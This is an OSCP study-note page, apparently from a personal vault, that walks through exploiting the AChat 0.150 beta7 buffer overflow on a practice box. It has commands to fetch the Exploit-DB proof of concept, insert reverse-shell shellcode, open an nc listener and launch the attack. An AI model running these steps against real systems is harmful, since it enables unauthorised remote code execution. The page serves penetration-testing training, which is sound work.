# Windows - Remote - AChat Buffer Overflow

**Step 26A of 50 · Windows**

*Exploit AChat 0.150 beta7 with the standalone Exploit-DB proof of concept.*

## Run this

> **Why:** These commands locate the standalone AChat proof of concept and copy it into the box workspace so its assumptions can be reviewed before execution.
```bash
searchsploit achat
searchsploit -x 36025
searchsploit -m 36025
```

The original PoC needs x86 Unicode-safe shellcode. `BufferRegister=EAX` describes where the decoder expects the encoded buffer. Do not generate this payload with an exploit framework; obtain a reviewed shellcode buffer that matches the PoC and replace its `buf` block manually or with the local helper.

> **Why:** This helper replaces the proof of concept's placeholder buffer with the reviewed Unicode-safe shellcode required by AChat's wide-character input handling.
```bash
# Replace the PoC's buf block with the reviewed Unicode-safe buffer.
python3 ~/Documents/Obsidian/main-vault/OSCP/TOOLS/buf_swap.py $BoxDir/36025.py $BoxIP
```

Verify Python 2 syntax before running:

> **Why:** Python 2 compiles the proof of concept without running it, catching syntax errors before the network-facing exploit attempt.
```bash
python2 -m py_compile $BoxDir/36025.py
```

Catch the callback and run the PoC:

> **Why:** The listener waits for the callback while the proof of concept sends the crafted buffer, so a returned shell confirms that the overwrite reached execution.
```bash
nc -lvnp $ListenPort
cd $BoxDir && python2 36025.py
```

## What did you get?

- [ ] A shell connects back → **Run `whoami` in the callback to confirm the identity, then go to Step 27 · [[Windows - Shell Received]]**
- [ ] The PoC prints its success marker but no callback → **Run `ip addr` to verify `$LocalIP`, run `ss -lunp | grep $ListenPort` to confirm the listener, verify UDP `$ExploitPort`, and regenerate the payload with the EAX encoder setting**
- [ ] Python errors → **Keep the original Python 2 packet sender and check the payload replacement**
- [ ] The service is no longer reachable → **Reset the box and retry once**

## Notes

AChat expects the overflow on UDP port $ExploitPort. The original PoC sends one large packet and exits. Do not replace its packet construction with a custom sender.

`buf_swap.py` at `OSCP/TOOLS/buf_swap.py` works on any Python 2 EDB PoC with a `buf` variable -- not just AChat. It handles all common buf formats (`""`, `b""`, one or two spaces) and uses a lambda replacement to avoid Python's `re.sub` treating `\x` bytes as backreferences.

## Gotcha

> [!warning] 💡
> BufferRegister=EAX is required. Without it, the payload can reach the target but fail during self-decoding.
>
> This page is incomplete until a non-framework shellcode-generation workflow is validated for the PoC. Ask Claude or the user to review that payload before relying on AChat in an exam.

## External Resources

- [Exploit-DB 36025](https://www.exploit-db.com/exploits/36025)
- [PayloadsAllTheThings: Shellcode and Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Shellcode%20and%20Injection)
## Seen in
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- confirmed in the box write-up

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
